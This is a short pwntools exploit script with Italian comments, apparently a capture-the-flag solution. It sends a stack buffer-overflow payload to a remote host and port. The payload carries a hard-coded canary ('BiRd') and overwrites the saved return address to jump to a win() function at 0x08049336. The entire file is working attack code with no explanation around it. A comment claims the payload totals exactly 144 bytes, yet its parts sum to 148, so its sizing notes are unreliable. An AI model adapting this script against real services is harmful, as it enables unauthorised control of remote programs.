#!/usr/bin/env python3

import argparse
from pwn import *
import sys

def main():
  # Disabilita i log di debug di Pwntools
  context.log_level = 'error'

  # Parsing degli argomenti da linea di comando
  parser = argparse.ArgumentParser(description="Exploit script using Pwntools")
  parser.add_argument(
    "host", type=str,
    help="The hostname or IP address to connect to",
  )
  parser.add_argument(
    "port", type=int,
    help="The port number of the service to connect to",
  )
  args = parser.parse_args()
  
  # Definizione dei componenti del payload
  buffer_size = 64
  canary = b'BiRd'        # Canary trovato: 0x42695264
  length_value = 144        # Impostare count a 144 byte

  # Indirizzo di ritorno verso win()
  vuln_return_address = p32(0x08049336)  # Assicurati che sia corretto

  # Costruzione del payload
  payload = b'A' * buffer_size    # Fill the buffer (64 byte)
  payload += canary         # Canary (4 byte)
  payload += b'B' * buffer_size   # Sovrascrittura di length (64 byte)
  payload += b'C' * 4         # Sovrascrittura di count (4 byte)
  payload += b'D' * 4         # Sovrascrittura di x (4 byte)
  payload += b'E' * 4         # Sovrascrittura di saved EBP (4 byte)
  payload += vuln_return_address  # Sovrascrittura di saved EIP (4 byte)
  # Non aggiungere '\n'

  # Calcolo della lunghezza totale del payload
  total_length = len(payload)    # Deve essere esattamente 144
  length = f"{total_length}\n".encode()

  # Debug: Stampa della lunghezza e del payload
  print(f"Payload Length Sent: {length.decode().strip()} bytes")
  print(f"Payload (Hex): {payload.hex()}")
  ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in payload)
  print(f"Payload (ASCII): '{ascii_repr}'")

  # Stabilire una connessione remota utilizzando Pwntools
  try:
    with remote(args.host, args.port) as connection:
      # Ricevere l'initial prompt
      initial_response = connection.recvuntil(b"> ", timeout=5)
      print(initial_response.decode('utf-8', errors='ignore'))
      
      # Inviare la lunghezza del payload
      connection.send(length)
      print(f"Inviata la lunghezza: {total_length} bytes")

      # Ricevere il secondo prompt
      intermediate_response = connection.recvuntil(b"> ", timeout=5)
      print(intermediate_response.decode('utf-8', errors='ignore'))

      # Inviare il payload
      connection.send(payload)
      print("Payload inviato con successo!")

      # Ricevere la risposta finale dal server
      final_response = connection.recvall(timeout=5)
      if final_response:
        print("Risposta del server:")
        print(final_response.decode('utf-8', errors='ignore'))
      else:
        print("Payload inviato. Verifica il comportamento del server.")

  except Exception as e:
    print(f"Si Ã¨ verificato un errore durante l'exploit: {e}")

if __name__ == "__main__":
  main()
